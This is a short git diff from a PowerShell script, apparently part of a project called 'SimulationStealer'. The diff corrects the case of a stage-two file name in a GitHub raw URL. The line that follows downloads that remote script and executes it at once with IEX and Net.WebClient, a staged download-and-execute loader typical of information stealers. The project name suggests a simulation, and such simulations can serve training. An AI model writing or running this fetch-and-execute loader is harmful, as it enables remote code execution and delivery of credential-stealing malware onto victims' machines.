@@ -17,5 +17,5 @@ ForEach($b in $a) {
 }
 
 # Appel Stage 2
-$url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/stage2.ps1"
+$url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/Stage2.ps1"
 IEX (New-Object Net.WebClient).DownloadString($url)
